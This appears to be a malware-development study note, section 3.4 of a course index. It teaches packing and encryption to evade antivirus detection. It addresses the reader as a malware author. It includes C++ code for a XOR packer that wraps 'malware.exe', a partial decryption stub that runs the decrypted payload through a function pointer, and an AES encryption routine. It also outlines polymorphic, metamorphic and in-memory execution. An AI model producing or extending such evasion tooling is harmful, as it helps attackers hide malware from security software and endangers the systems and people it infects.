# Index 
- [[3. Common Malware Techniques]]
	- [[3.1 Process Injection Techniques]]
	- [[3.2 Persistence Mechanisms]]
	- [[3.3 Hooking Windows APIs]]
	- [[3.4 Packing & Encryption]]

# Key Concepts in Packing and Encryption

#### What is Packing?
Packing involves compressing or encrypting the malware’s code and data into a different format and then decompressing or decrypting it at runtime. This helps to:
- Obfuscate static analysis: Packed malware looks different from known signatures that AV engines use for detection.
- Conceal malware logic: By packing the malicious payload, the AV cannot easily inspect the binary code and detect malicious behavior.
- Reduce file size: Some packers compress the executable, making it smaller.

Popular packers used in malware development include:
- UPX (Ultimate Packer for Executables) – commonly used but often detected by AV because it's widely known.
- Custom packers – you can write your own packing routine, which is less likely to be detected by AV solutions.

#### What is Encryption?
Encryption involves encoding the payload in such a way that it is unintelligible to AV scanners until it is decrypted at runtime. A simple technique like XOR can be used, but advanced ciphers (AES, RC4, etc.) can provide stronger obfuscation.

The idea is that only your malware knows how to decrypt itself at runtime, making it more difficult for AV to perform static signature-based detection.

# Process Flow of Packing and Encryption

1. Packing:
   - The malware's original code is packed or compressed.
   - A stub (small piece of code) is added at the beginning of the packed file, which knows how to unpack and execute the original code at runtime.
   
2. Encryption:
   - The malware payload is encrypted using a symmetric encryption algorithm (XOR, AES, etc.).
   - A decryption stub is added, which decrypts the payload in memory and then transfers execution to the decrypted code.

3. Runtime Unpacking/Decryption:
   - When the packed malware is executed, the stub executes first.
   - The stub decompresses/decrypts the malicious payload in memory.
   - Execution is transferred to the malicious payload once it’s unpacked or decrypted.

# Deep Dive: Packing and Custom Packers

#### Creating a Custom Packer
A custom packer is a small executable program that wraps around the original malware binary. It performs the following tasks:
1. Reads the original malware (the payload).
2. Compresses or encrypts the payload.
3. Writes a new file that consists of:
   - A decompression/decryption stub.
   - The packed/encrypted malware payload.

The stub is the first code to execute and is responsible for decompressing or decrypting the payload and running it.

#### Example: Custom Packer Using XOR Encryption in C++
Let's go through an example where you build a simple custom packer using XOR encryption to encrypt the original malware's payload.

1. Step 1: Define the XOR encryption function
We’ll write a simple function that uses XOR to encrypt the payload. The same function can be used for both encryption and decryption (as XOR is symmetric).

```cpp
void xorEncryptDecrypt(char* data, size_t dataSize, const char* key, size_t keySize) {
    for (size_t i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize]; // XOR with the key
    }
}
```

2. Step 2: Packing the Payload
Now, we'll build a simple packer that:
   - Opens the original payload file (malware).
   - Reads the content of the file.
   - Encrypts it using XOR.
   - Writes the encrypted content along with a decryption stub into a new executable.

```cpp
#include <iostream>
#include <fstream>

// XOR encryption function
void xorEncryptDecrypt(char* data, size_t dataSize, const char* key, size_t keySize) {
    for (size_t i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize]; // XOR with the key
    }
}

int main() {
    const char* key = "simplekey"; // XOR key for encryption/decryption

    // Step 1: Open the original payload (malware executable)
    std::ifstream payloadFile("malware.exe", std::ios::binary);
    if (!payloadFile) {
        std::cerr << "Failed to open the original malware file." << std::endl;
        return 1;
    }

    // Step 2: Read the payload content
    payloadFile.seekg(0, std::ios::end);
    size_t payloadSize = payloadFile.tellg();
    payloadFile.seekg(0, std::ios::beg);
    char* payloadData = new char[payloadSize];
    payloadFile.read(payloadData, payloadSize);
    payloadFile.close();

    // Step 3: Encrypt the payload
    xorEncryptDecrypt(payloadData, payloadSize, key, strlen(key));

    // Step 4: Write the encrypted payload and the decryption stub into a new packed file
    std::ofstream packedFile("packed_malware.exe", std::ios::binary);
    if (!packedFile) {
        std::cerr << "Failed to create the packed file." << std::endl;
        return 1;
    }

    // Here, you would write the decryption stub first (stub implementation not shown for brevity)
    // For now, let's assume we have a simple decryption stub ready

    // Write the encrypted payload
    packedFile.write(payloadData, payloadSize);
    packedFile.close();

    delete[] payloadData;
    std::cout << "Payload packed and encrypted successfully." << std::endl;

    return 0;
}
```

In this example, the `xorEncryptDecrypt` function encrypts the original payload with a key. The encrypted payload is then saved into a new file, along with a decryption stub that will be used to decrypt it at runtime.

#### Creating a Decryption Stub
The decryption stub is embedded into the packed executable. When the packed malware is executed, the stub runs first, decrypts the payload in memory, and then transfers control to the original malicious code.

Example of a simple decryption stub:

```cpp
void xorEncryptDecrypt(char* data, size_t dataSize, const char* key, size_t keySize) {
    for (size_t i = 0; i < dataSize; ++i) {
        data[i] ^= key[i % keySize]; // XOR with the key
    }
}

int main() {
    const char* key = "simplekey"; // XOR key for decryption

    // Step 1: Locate the encrypted payload (in real scenarios, this would involve locating the payload in memory)
    char* encryptedPayload = /* pointer to the encrypted payload in memory */;
    size_t payloadSize = /* size of the encrypted payload */;

    // Step 2: Decrypt the payload
    xorEncryptDecrypt(encryptedPayload, payloadSize, key, strlen(key));

    // Step 3: Execute the decrypted payload (simplified for demonstration purposes)
    // Typically, you'd use a function pointer to execute the decrypted code:
    // ((void(*)())encryptedPayload)();

    return 0;
}
```

This stub decrypts the payload using XOR and executes it. The real complexity comes in finding the location of the encrypted payload in memory and correctly transferring execution flow to it.

#### Improving the Encryption Algorithm
XOR encryption is simple and easy to implement but can be weak and detectable. A better approach would be to use more sophisticated encryption algorithms such as AES, which provides stronger protection against reverse engineering.

Here is an example of how you might implement AES encryption:

```cpp
#include <openssl/aes.h>

// Example using OpenSSL's AES encryption
void aesEncrypt(const unsigned char* data, size_t dataSize, const unsigned char* key, unsigned char* output) {
    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);  // 128-bit key for AES
    for (size_t i = 0; i < dataSize; i += AES_BLOCK_SIZE) {
        AES_encrypt(data + i, output + i, &aesKey);
    }
}
```

This example uses the OpenSSL library to perform AES encryption, which is more secure and commonly used in malware packing. Similarly, you would implement an AES decryption stub to unpack the malware at runtime.

# Polymorphic and Metamorphic Malware
- Polymorphic Malware: Changes its appearance (code) every time it replicates or is executed, but the core functionality remains the same. Polymorphic malware uses techniques like encryption with random keys to evade signature-based detection.
- Metamorphic Malware: Goes a step further by actually rewriting its code with each execution. This is harder to implement but more effective against AVs that use both signature-based and heuristic analysis.

# In-Memory Execution
Another advanced technique to avoid detection is in-memory execution. This involves keeping the malware payload entirely in memory without writing it to disk, where AV scanners typically monitor for malicious files.

- Load the payload directly into memory and execute it from there.
- This can be done by injecting code into a legitimate process (e.g., using process injection techniques).